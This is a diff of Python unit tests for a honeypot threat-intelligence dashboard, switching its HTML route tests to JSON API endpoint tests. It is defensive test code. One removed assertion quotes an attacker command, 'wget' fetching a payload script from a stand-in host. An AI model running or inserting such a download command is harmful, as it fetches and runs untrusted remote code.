@@ -125,54 +125,61 @@ class DashboardDataTests(unittest.TestCase):
         self.assertEqual(blocklist_ips, ["198.51.100.24"])
 
 
-class DashboardRouteTests(unittest.TestCase):
-    def test_overview_route_renders(self) -> None:
+class DashboardJSONAPITests(unittest.TestCase):
+    def test_api_summary_returns_data(self) -> None:
         with tempfile.TemporaryDirectory() as tmpdir:
             records_path = Path(tmpdir) / "records.jsonl"
             _write_records(records_path)
             app = create_app(records_path=records_path)
 
             with app.test_client() as client:
-                response = client.get("/")
+                response = client.get("/api/summary")
 
         self.assertEqual(response.status_code, 200)
-        html = response.get_data(as_text=True)
-        self.assertIn("Overview", html)
-        self.assertIn("Skipped Malformed Lines", html)
-        self.assertIn("1", html)
-        self.assertIn("wget http://bad.example/payload.sh", html)
+        data = response.get_json()
+        self.assertEqual(data["total_events"], 2)
+        self.assertEqual(data["unique_source_ips"], 2)
+        self.assertIn("brute_force", data["by_attack_category"])
+        self.assertIn("malware_download", data["by_attack_category"])
 
-    def test_events_route_applies_filters(self) -> None:
+    def test_api_events_applies_filters(self) -> None:
         with tempfile.TemporaryDirectory() as tmpdir:
             records_path = Path(tmpdir) / "records.jsonl"
             _write_records(records_path)
             app = create_app(records_path=records_path)
 
             with app.test_client() as client:
-                response = client.get("/events?source_ip=203.0.113.10&refresh=3")
+                response = client.get("/api/events?source_ip=203.0.113.10")
 
         self.assertEqual(response.status_code, 200)
-        html = response.get_data(as_text=True)
-        self.assertIn("203.0.113.10", html)
-        self.assertNotIn("198.51.100.24", html)
-        self.assertIn("Auto-refresh every 3 seconds", html)
+        data = response.get_json()
+        self.assertEqual(len(data["records"]), 1)
+        self.assertEqual(data["records"][0]["source_ip"], "203.0.113.10")
 
-    def test_detail_route_shows_event_data(self) -> None:
+    def test_api_event_detail_returns_event(self) -> None:
         with tempfile.TemporaryDirectory() as tmpdir:
             records_path = Path(tmpdir) / "records.jsonl"
             _write_records(records_path)
             app = create_app(records_path=records_path)
 
             with app.test_client() as client:
-                response = client.get("/events/1")
+                response = client.get("/api/events/1")
 
         self.assertEqual(response.status_code, 200)
-        html = response.get_data(as_text=True)
-        self.assertIn("Event Detail", html)
-        self.assertIn("malware_download", html)
-        self.assertIn("confidence", html)
-        self.assertIn("Indicators", html)
-        self.assertIn("Threat Intel", html)
+        data = response.get_json()
+        classification = data.get("classification") or {}
+        self.assertIn(classification.get("attack_category", ""), ["malware_download", "brute_force"])
+
+    def test_api_event_detail_404_on_missing(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            records_path = Path(tmpdir) / "records.jsonl"
+            _write_records(records_path)
+            app = create_app(records_path=records_path)
+
+            with app.test_client() as client:
+                response = client.get("/api/events/9999")
+
+        self.assertEqual(response.status_code, 404)
 
     def test_export_routes_return_downloadable_outputs(self) -> None:
         with tempfile.TemporaryDirectory() as tmpdir:
@@ -181,16 +188,42 @@ class DashboardRouteTests(unittest.TestCase):
             app = create_app(records_path=records_path)
 
             with app.test_client() as client:
-                blocklist_response = client.get("/exports/blocklist.txt")
-                malicious_response = client.get("/exports/malicious.json")
-                report_response = client.get("/exports/report.md")
+                blocklist_response = client.get("/api/exports/blocklist.txt")
+                malicious_response = client.get("/api/exports/malicious.json")
+                report_response = client.get("/api/exports/report.md")
 
         self.assertEqual(blocklist_response.status_code, 200)
         self.assertIn("198.51.100.24", blocklist_response.get_data(as_text=True))
         self.assertEqual(malicious_response.status_code, 200)
-        self.assertIn("\"malicious_record_count\": 1", malicious_response.get_data(as_text=True))
+        self.assertIn('"malicious_record_count": 1', malicious_response.get_data(as_text=True))
         self.assertEqual(report_response.status_code, 200)
         self.assertIn("# Honeypot Threat Intelligence Report", report_response.get_data(as_text=True))
+
+    def test_top_threats_returns_data(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            records_path = Path(tmpdir) / "records.jsonl"
+            _write_records(records_path)
+            app = create_app(records_path=records_path)
+
+            with app.test_client() as client:
+                response = client.get("/api/top-threats")
+
+        self.assertEqual(response.status_code, 200)
+        data = response.get_json()
+        self.assertGreater(len(data["threats"]), 0)
+
+    def test_sessions_endpoint_without_db(self) -> None:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            records_path = Path(tmpdir) / "records.jsonl"
+            _write_records(records_path)
+            app = create_app(records_path=records_path)
+
+            with app.test_client() as client:
+                response = client.get("/api/sessions")
+
+        self.assertEqual(response.status_code, 200)
+        data = response.get_json()
+        self.assertIn("Database not configured", data.get("message", ""))
 
 
 if __name__ == "__main__":
